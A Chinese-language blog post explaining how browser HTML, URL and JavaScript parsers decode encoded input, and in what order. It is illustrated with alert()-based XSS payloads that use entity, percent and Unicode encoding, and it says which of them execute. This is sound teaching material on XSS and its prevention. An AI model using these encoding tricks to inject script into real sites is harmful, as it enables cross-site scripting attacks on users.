URL编码</h3><blockquote>\n<p>RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。</p>\n</blockquote>\n<p>编码方式，</p>\n<blockquote>\n<p><code>%</code>加<code>字符在ASCII码表中的十六进制值</code>。</p>\n<p>例如，<code>/</code>在ASCII码表中十六进制为<code>0x2f</code>，那么它对应的URL编码为<code>%2f</code>。</p>\n</blockquote>\n<p>JavaScript中提供了3个函数用来对Url编码以得到合法的Url：</p>\n<ul>\n<li>escape()</li>\n<li>encodeURI（）</li>\n<li>encodeURIComponent（）</li>\n</ul>\n<p>参考连接：<a href=\"https://www.cnblogs.com/jerrysion/p/5522673.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/jerrysion/p/5522673.html</a></p>\n<h3 id=\"0x02-HTML编码（字符实体）\"><a href=\"#0x02-HTML编码（字符实体）\" class=\"headerlink\" title=\"0x02 HTML编码（字符实体）\"></a>0x02 HTML编码（字符实体）</h3><p>字符实体是一个预先定义好的转义序列。</p>\n<p>字符实体两种表示方法:</p>\n<blockquote>\n<ul>\n<li>字符实体以<code>&amp;</code>开头+预先定义的<code>实体名称</code>+<code>;</code>分号结束，如“&lt;”的实体名称为<code>&amp;lt;</code></li>\n<li>字符实体还可以以<code>&amp;</code>开头+<code>#</code>符号+<code>字符在ASCII对应的十进制数字</code>+<code>;</code>分号结束，如<code>&lt;</code>的实体编号为<code>&amp;#60;</code>。</li>\n</ul>\n</blockquote>\n<p><strong>字符都是有实体编号的，但有些字符是没有实体名称的。</strong></p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190307120011.png\" alt></p>\n<h3 id=\"0x03-JavaScript编码\"><a href=\"#0x03-JavaScript编码\" class=\"headerlink\" title=\"0x03 JavaScript编码\"></a>0x03 JavaScript编码</h3><p>最常用的如<code>\\uXXXX</code>这种写法的Unicode转义序列，表示一个字符，其中<code>xxxx</code>表示一个16进制数字，如<code>&lt;</code>Unicode编码为<code>\\u003c</code>。</p>\n<h2 id=\"二、解析HTML文档\"><a href=\"#二、解析HTML文档\" class=\"headerlink\" title=\"二、解析HTML文档\"></a>二、解析HTML文档</h2><p>解析一个HTML文档涉及三个主要过程：HTML解析——&gt;URL解析——JavaScript解析。</p>\n<p>每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。</p>\n<h3 id=\"0x00-HTML解析器\"><a href=\"#0x00-HTML解析器\" class=\"headerlink\" title=\"0x00 HTML解析器\"></a>0x00 HTML解析器</h3><p>HTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。</p>\n<blockquote>\n<p>当HTML解析器遇到<code>&lt;</code>字符，且字符后不包含<code>/</code>,即不是闭合标签时，状态机就会进入<strong><code>标签打开状态（Tag Open State）</code></strong>，随后再进入<strong><code>标签名称状态（Tag Name State）</code></strong>、<strong><code>属性名称前状态（Before Attribute Name State）</code></strong>……最后进入<strong><code>数据状态（Data State）</code></strong>并且发布当前<strong><code>标签令牌（Token）</code></strong>。状态机处于<strong><code>数据状态（Data State）</code></strong>时，会继续上述的步骤，遇到完整的标签就发出<strong><code>标签令牌（Token）</code></strong>。</p>\n</blockquote>\n<p>HTML解析器处于<strong><code>数据状态（Data State）</code></strong>、<strong><code>RCDATA 状态（RCDATA State）</code></strong>、<strong><code>属性值状态（Attribute Value State）</code></strong>时，<strong>字符实体</strong>会被解码为对应的字符。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></strong></p>\n<p><code>&lt;</code>和<code>&gt;</code>被编码为字符实体<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p>\n<p>当HTML解析器解析完<code>&lt;div&gt;</code>时，会进入<strong><code>数据状态（Data State）</code></strong>并发布标签令牌。接着解析到实体<code>&amp;#60;</code>时因为处在<strong><code>数据状态（Data State）</code></strong>就会对实体进行解码为<code>&lt;</code>，后面的<code>&amp;#62;</code>同样道理被解码为<code>&gt;</code>。</p>\n</blockquote>\n<p>这里会有个问题，被解码后，<code>img</code>是否会被解析为HTML标签而导致JS执行呢？</p>\n<blockquote>\n<p>答案是否定的。因为解析器在使用字符引用后不会转换到<strong><code>标签打开状态（Tag Open State）</code></strong>，不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。</p>\n<p><strong>这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。</strong></p>\n</blockquote>\n<p><strong>RCDATA</strong></p>\n<p>在HTML中，属于<strong><code>RCDATA Elements</code></strong>的标签有两个：<code>textarea</code>、<code>title</code>。</p>\n<p><strong><code>RCDATA Elements</code></strong>类型的标签可以包含文本内容和字符实体。</p>\n<p>解析器解析到<code>textarea</code>、<code>title</code>标签的数据部分时，状态会进入<strong><code>RCDATA State</code></strong>。</p>\n<p>前面我们提到，处于<strong><code>RCDATA State</code></strong>状态时，字符实体是会被解析器解码的。</p>\n<p>例子， </p>\n<blockquote>\n<p><strong><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></strong></p>\n<p><code>&lt;</code>和<code>&gt;</code>被编码为实体<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p>\n<p>解析器解析到它们时会进行解码，最终得到<strong><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></strong>。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入<strong><code>标签打开状态（Tag Open State）</code></strong>，因此里面的<code>&lt;script&gt;</code>并不会被解析为HTML标签。</p>\n</blockquote>\n<p>事实上，任何<code>RCDATA</code>（<code>textarea</code>、<code>title</code>里面的数据）都不会使得状态机进入<strong><code>标签打开状态（Tag Open State）</code></strong>，So if a user input wants to escape out of the CDATA context, it has to use the exact “]]&gt;” sequence without any encoding。</p>\n<p>HTML解析规范：<a href=\"https://html.spec.whatwg.org/multipage/parsing.html#tokenization\" target=\"_blank\" rel=\"noopener\">https://html.spec.whatwg.org/multipage/parsing.html#tokenization</a></p>\n<h3 id=\"0x01-URL解析器\"><a href=\"#0x01-URL解析器\" class=\"headerlink\" title=\"0x01 URL解析器\"></a>0x01 URL解析器</h3><p>URL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。</p>\n<p>首先，要注意的是URL的<code>Scheme</code>部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入<strong><code>No Scheme</code></strong>状态。</p>\n<p>例如，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>URL编码部分的是<code>javascript:alert(1)</code>。</p>\n<p>JS不会被执行，因为作为<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>这个字符串被编码，导致URL解析器状态机进入<strong><code>No Scheme</code></strong>状态。</p>\n</blockquote>\n<p>同样，URL中的<code>:</code>也不能被以任何方式编码，否则URL解析器的状态机也将进入<strong><code>No Scheme</code></strong>状态。</p>\n<p>例如，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>由于<code>:</code>被URL编码为<code>%3a</code>，导致URL状态机进入<strong><code>No Scheme</code></strong>状态，JS代码不能执行。</p>\n</blockquote>\n<p>另一个例子：</p>\n<p><strong><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></strong></p>\n<p><code>&quot;javascript&quot;</code>这个字符串被实体化编码，<code>:</code>没有被编码,<code>alert(2)</code>被URL编码。</p>\n<p>例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>这个字符串被编码了但JS还是被执行了？</p>\n<blockquote>\n<p>原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于<strong><code>属性值状态（Attribute Value State）</code></strong>时，字符实体时会被解码的，此处在<code>href</code>属性中，所以被实体化编码的<code>&quot;javascript&quot;</code>字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>字符串已被解码，而并不再是被实体编码的状态。</p>\n</blockquote>\n<p>URL解析规范：<a href=\"https://url.spec.whatwg.org/\" target=\"_blank\" rel=\"noopener\">https://url.spec.whatwg.org/</a></p>\n<h3 id=\"0x02-JavaScript解析器\"><a href=\"#0x02-JavaScript解析器\" class=\"headerlink\" title=\"0x02 JavaScript解析器\"></a>0x02 JavaScript解析器</h3><p>JavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。</p>\n<p>在HTML中，属于<strong><code>Raw text elements</code></strong>的标签有两个：<code>script</code>、<code>style</code>。</p>\n<p>在<strong><code>Raw text elements</code></strong>类型标签下的所有内容块都属于该标签。</p>\n<p>存在一条特性：</p>\n<blockquote>\n<p>即<strong><code>Raw text elements</code></strong>类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到<code>script</code>、<code>style</code>标签的内容块（数据）部分时，状态会进入<strong><code>Script Data State</code></strong>，该状态并不在我们前面说的会解码字符实体的三条状态之中。</p>\n</blockquote>\n<p>因此，<strong><code>&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></strong>这样字符实体并不会被解码，也就不会执行JS。</p>\n<p>形如 <code>\\uXXXX</code>这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。</p>\n<p>首先，JavaScript中有三个地方可以出现Unicode字符转义序列：</p>\n<p>字符串中（in String）</p>\n<blockquote>\n<p><code>Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals.</code></p>\n<p>即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如<code>\\u000A</code>在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是不会被解码。</p>\n</blockquote>\n<p>标识符中（in identifier names）</p>\n<blockquote>\n<p>若Unicode转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。</p>\n<p>例如，<strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;</code></strong></p>\n<p>被编码转义的部分为<code>alert</code>字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。</p>\n</blockquote>\n<p>控制字符中（in control characters）</p>\n<blockquote>\n<p>若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。</p>\n<p>控制字符即<code>&#39;</code>、<code>&quot;</code>、<code>()</code>等。</p>\n<p>例如，<strong><code>&lt;script&gt; alert\\u0028&quot;xss&quot;); &lt;/script&gt;</code></strong>，<code>(</code>进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分<code>alert(</code>。</p>\n<p>因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。</p>\n</blockquote>\n<p>总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;</code></strong></p>\n<p>被编码部分为<code>alert(11)</code>。</p>\n<p>该例子中的JS不会被执行，因为控制字符被编码了。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;</code></strong></p>\n<p>被编码部分为<code>alert</code>及括号内为<code>12</code>。</p>\n<p>该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加<code>&quot;&quot;</code>或<code>&#39;&#39;</code>使其变为字符串，作为字符串也只能作为普通字符。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;alert(&#39;13\\u0027)&lt;/script&gt;</code></strong></p>\n<p>被编码处为<code>&#39;</code>。</p>\n<p>该例的JS不会执行，因为控制字符被编码了，解码后的<code>&#39;</code>将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有<code>&#39;</code>来结束字符串。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;alert(&#39;14\\u000a&#39;)&lt;/script&gt;</code></strong></p>\n<p>该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。</p>\n</blockquote>\n<h3 id=\"0x03-解析顺序\"><a href=\"#0x03-解析顺序\" class=\"headerlink\" title=\"0x03 解析顺序\"></a>0x03 解析顺序</h3><p>首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。</p>\n<p>URL解析和JavaScript解析，它们的解析顺序要根据情况而定。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>该例子中，首先由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着URL解析器对<code>UserInput</code>进行URL decode；</p>\n<p>如果URL的Scheme部分为<code>javascript</code>的话，JavaScript解析器会再对<code>UserInput</code>进行解码。</p>\n<p>所以解析顺序是：HTML解析——&gt;URL解析——&gt;JavaScript解析。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;a href=# onclick=&quot;window.open(&#39;UserInput&#39;)&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>该例子中，首先由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着由JavaScript解析器会再对<code>onclick</code>部分的JS进行解析并执行JS；</p>\n<p>执行JS后<code>window.open(&#39;UserInput&#39;)</code>函数的参数会传入URL，所以再由URL解析器对<code>UserInput</code>部分进行解码。</p>\n<p>因此解析顺序为：HTML解析——&gt;JavaScript解析——&gt;URL解析。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;javascript:window.open(&#39;UserInput&#39;)&quot;&gt;</code></strong></p>\n<p>该例子中，首先还是由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着由URL解析器解析<code>href</code>的属性值；</p>\n<p>然后由于Scheme为<code>javascript</code>，所以由JavaScript解析；</p>\n<p>解析执行JS后<code>window.open(&#39;UserInput&#39;)</code>函数传入URL，所以再由URL解析器解析。</p>\n<p>所以解析顺序为：HTML解析——&gt;URL解析——&gt;JavaScript解析——&gt;URL解析。</p>\n</blockquote>\n<p>综合实例：</p>\n<p><strong><code>&lt;a  href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;\n&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;\n&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;\n&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;\n&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;\n&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;\n&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;\n&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;\n&amp;#x35;&amp;#x29;&quot;&gt; &lt;/a&gt;</code></strong></p>\n<p>首先HTML解析器进行解析，解析到<code>href</code>属性的值时，状态机进入<strong><code>属性值状态（Attribute Value State）</code></strong>，该状态会解码字符实体，解码得到结果：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105040.png\" alt></p>\n<p>接着由URL解析器进行解析并解码：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105254.png\" alt></p>\n<p>再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105533.png\" alt></p>\n<p>经过三轮解析解码后得到结果：<code>&lt;a href=&quot;javascript:alert(15)&quot;&gt;&lt;/a&gt;</code></p>\n<p>参考连接：</p>\n<p><a href=\"https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html\" target=\"_blank\" rel=\"noopener\">https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html</a></p>\n<p><a href=\"https://security.yirendai.com/news/share/26\" target=\"_blank\" rel=\"noopener\">https://security.yirendai.com/news/share/26</a></p>\n<p><a href=\"https://xz.aliyun.com/t/1556\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/1556</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、前端基本编码知识\"><a href=\"#一、前端基本编码知识\" class=\"headerlink\" title=\"一、前端基本编码知识\"></a>一、前端基本编码知识</h2><h3 id=\"0x00-为什么要进行编码\"><a href=\"#0x00-为什么要进行编码\" class=\"headerlink\" title=\"0x00 为什么要进行编码?\"></a>0x00 为什么要进行编码?</h3><blockquote>\n<p>主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会<strong>引起歧义</strong>。</p>\n</blockquote>\n<p>对于URL，</p>\n<blockquote>\n<p><code>&amp;</code>用于分割多个参数，倘若有某个参数键值对为<code>name=v&amp;lue</code>，就会因为<code>name</code>参数的值<code>v&amp;lue</code>中携带了<code>&amp;</code>而造成歧义。因此需要对<code>&amp;</code>进行URL编码。</p>\n</blockquote>\n<p>对于HTML，</p>\n<blockquote>\n<p>当浏览器遇到<code>&lt;</code>会识别为元素定义的开始，<code>&gt;</code>会识别为元素的结束。倘若有<code>&lt;div  id=&quot;1&gt;&quot; &gt;&lt;/div&gt;</code>，由于标签的属性值携带了<code>&gt;</code>，同样会造成歧义。因此需要属性值的<code>&gt;</code>需要进行HTML编码，即使用字符实体。</p>\n</blockquote>","more":"<h3 id=\"0x01-URL编码\"><a href=\"#0x01-URL编码\" class=\"headerlink\" title=\"0x01 URL编码\"></a>0x01 URL编码</h3><blockquote>\n<p>RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。</p>\n</blockquote>\n<p>编码方式，</p>\n<blockquote>\n<p><code>%</code>加<code>字符在ASCII码表中的十六进制值</code>。</p>\n<p>例如，<code>/</code>在ASCII码表中十六进制为<code>0x2f</code>，那么它对应的URL编码为<code>%2f</code>。</p>\n</blockquote>\n<p>JavaScript中提供了3个函数用来对Url编码以得到合法的Url：</p>\n<ul>\n<li>escape()</li>\n<li>encodeURI（）</li>\n<li>encodeURIComponent（）</li>\n</ul>\n<p>参考连接：<a href=\"https://www.cnblogs.com/jerrysion/p/5522673.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/jerrysion/p/5522673.html</a></p>\n<h3 id=\"0x02-HTML编码（字符实体）\"><a href=\"#0x02-HTML编码（字符实体）\" class=\"headerlink\" title=\"0x02 HTML编码（字符实体）\"></a>0x02 HTML编码（字符实体）</h3><p>字符实体是一个预先定义好的转义序列。</p>\n<p>字符实体两种表示方法:</p>\n<blockquote>\n<ul>\n<li>字符实体以<code>&amp;</code>开头+预先定义的<code>实体名称</code>+<code>;</code>分号结束，如“&lt;”的实体名称为<code>&amp;lt;</code></li>\n<li>字符实体还可以以<code>&amp;</code>开头+<code>#</code>符号+<code>字符在ASCII对应的十进制数字</code>+<code>;</code>分号结束，如<code>&lt;</code>的实体编号为<code>&amp;#60;</code>。</li>\n</ul>\n</blockquote>\n<p><strong>字符都是有实体编号的，但有些字符是没有实体名称的。</strong></p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190307120011.png\" alt></p>\n<h3 id=\"0x03-JavaScript编码\"><a href=\"#0x03-JavaScript编码\" class=\"headerlink\" title=\"0x03 JavaScript编码\"></a>0x03 JavaScript编码</h3><p>最常用的如<code>\\uXXXX</code>这种写法的Unicode转义序列，表示一个字符，其中<code>xxxx</code>表示一个16进制数字，如<code>&lt;</code>Unicode编码为<code>\\u003c</code>。</p>\n<h2 id=\"二、解析HTML文档\"><a href=\"#二、解析HTML文档\" class=\"headerlink\" title=\"二、解析HTML文档\"></a>二、解析HTML文档</h2><p>解析一个HTML文档涉及三个主要过程：HTML解析——&gt;URL解析——JavaScript解析。</p>\n<p>每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。</p>\n<h3 id=\"0x00-HTML解析器\"><a href=\"#0x00-HTML解析器\" class=\"headerlink\" title=\"0x00 HTML解析器\"></a>0x00 HTML解析器</h3><p>HTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。</p>\n<blockquote>\n<p>当HTML解析器遇到<code>&lt;</code>字符，且字符后不包含<code>/</code>,即不是闭合标签时，状态机就会进入<strong><code>标签打开状态（Tag Open State）</code></strong>，随后再进入<strong><code>标签名称状态（Tag Name State）</code></strong>、<strong><code>属性名称前状态（Before Attribute Name State）</code></strong>……最后进入<strong><code>数据状态（Data State）</code></strong>并且发布当前<strong><code>标签令牌（Token）</code></strong>。状态机处于<strong><code>数据状态（Data State）</code></strong>时，会继续上述的步骤，遇到完整的标签就发出<strong><code>标签令牌（Token）</code></strong>。</p>\n</blockquote>\n<p>HTML解析器处于<strong><code>数据状态（Data State）</code></strong>、<strong><code>RCDATA 状态（RCDATA State）</code></strong>、<strong><code>属性值状态（Attribute Value State）</code></strong>时，<strong>字符实体</strong>会被解码为对应的字符。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></strong></p>\n<p><code>&lt;</code>和<code>&gt;</code>被编码为字符实体<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p>\n<p>当HTML解析器解析完<code>&lt;div&gt;</code>时，会进入<strong><code>数据状态（Data State）</code></strong>并发布标签令牌。接着解析到实体<code>&amp;#60;</code>时因为处在<strong><code>数据状态（Data State）</code></strong>就会对实体进行解码为<code>&lt;</code>，后面的<code>&amp;#62;</code>同样道理被解码为<code>&gt;</code>。</p>\n</blockquote>\n<p>这里会有个问题，被解码后，<code>img</code>是否会被解析为HTML标签而导致JS执行呢？</p>\n<blockquote>\n<p>答案是否定的。因为解析器在使用字符引用后不会转换到<strong><code>标签打开状态（Tag Open State）</code></strong>，不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。</p>\n<p><strong>这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。</strong></p>\n</blockquote>\n<p><strong>RCDATA</strong></p>\n<p>在HTML中，属于<strong><code>RCDATA Elements</code></strong>的标签有两个：<code>textarea</code>、<code>title</code>。</p>\n<p><strong><code>RCDATA Elements</code></strong>类型的标签可以包含文本内容和字符实体。</p>\n<p>解析器解析到<code>textarea</code>、<code>title</code>标签的数据部分时，状态会进入<strong><code>RCDATA State</code></strong>。</p>\n<p>前面我们提到，处于<strong><code>RCDATA State</code></strong>状态时，字符实体是会被解析器解码的。</p>\n<p>例子， </p>\n<blockquote>\n<p><strong><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></strong></p>\n<p><code>&lt;</code>和<code>&gt;</code>被编码为实体<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p>\n<p>解析器解析到它们时会进行解码，最终得到<strong><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></strong>。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入<strong><code>标签打开状态（Tag Open State）</code></strong>，因此里面的<code>&lt;script&gt;</code>并不会被解析为HTML标签。</p>\n</blockquote>\n<p>事实上，任何<code>RCDATA</code>（<code>textarea</code>、<code>title</code>里面的数据）都不会使得状态机进入<strong><code>标签打开状态（Tag Open State）</code></strong>，So if a user input wants to escape out of the CDATA context, it has to use the exact “]]&gt;” sequence without any encoding。</p>\n<p>HTML解析规范：<a href=\"https://html.spec.whatwg.org/multipage/parsing.html#tokenization\" target=\"_blank\" rel=\"noopener\">https://html.spec.whatwg.org/multipage/parsing.html#tokenization</a></p>\n<h3 id=\"0x01-URL解析器\"><a href=\"#0x01-URL解析器\" class=\"headerlink\" title=\"0x01 URL解析器\"></a>0x01 URL解析器</h3><p>URL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。</p>\n<p>首先，要注意的是URL的<code>Scheme</code>部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入<strong><code>No Scheme</code></strong>状态。</p>\n<p>例如，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>URL编码部分的是<code>javascript:alert(1)</code>。</p>\n<p>JS不会被执行，因为作为<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>这个字符串被编码，导致URL解析器状态机进入<strong><code>No Scheme</code></strong>状态。</p>\n</blockquote>\n<p>同样，URL中的<code>:</code>也不能被以任何方式编码，否则URL解析器的状态机也将进入<strong><code>No Scheme</code></strong>状态。</p>\n<p>例如，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>由于<code>:</code>被URL编码为<code>%3a</code>，导致URL状态机进入<strong><code>No Scheme</code></strong>状态，JS代码不能执行。</p>\n</blockquote>\n<p>另一个例子：</p>\n<p><strong><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></strong></p>\n<p><code>&quot;javascript&quot;</code>这个字符串被实体化编码，<code>:</code>没有被编码,<code>alert(2)</code>被URL编码。</p>\n<p>例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>这个字符串被编码了但JS还是被执行了？</p>\n<blockquote>\n<p>原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于<strong><code>属性值状态（Attribute Value State）</code></strong>时，字符实体时会被解码的，此处在<code>href</code>属性中，所以被实体化编码的<code>&quot;javascript&quot;</code>字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>字符串已被解码，而并不再是被实体编码的状态。</p>\n</blockquote>\n<p>URL解析规范：<a href=\"https://url.spec.whatwg.org/\" target=\"_blank\" rel=\"noopener\">https://url.spec.whatwg.org/</a></p>\n<h3 id=\"0x02-JavaScript解析器\"><a href=\"#0x02-JavaScript解析器\" class=\"headerlink\" title=\"0x02 JavaScript解析器\"></a>0x02 JavaScript解析器</h3><p>JavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。</p>\n<p>在HTML中，属于<strong><code>Raw text elements</code></strong>的标签有两个：<code>script</code>、<code>style</code>。</p>\n<p>在<strong><code>Raw text elements</code></strong>类型标签下的所有内容块都属于该标签。</p>\n<p>存在一条特性：</p>\n<blockquote>\n<p>即<strong><code>Raw text elements</code></strong>类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到<code>script</code>、<code>style</code>标签的内容块（数据）部分时，状态会进入<strong><code>Script Data State</code></strong>，该状态并不在我们前面说的会解码字符实体的三条状态之中。</p>\n</blockquote>\n<p>因此，<strong><code>&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></strong>这样字符实体并不会被解码，也就不会执行JS。</p>\n<p>形如 <code>\\uXXXX</code>这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。</p>\n<p>首先，JavaScript中有三个地方可以出现Unicode字符转义序列：</p>\n<p>字符串中（in 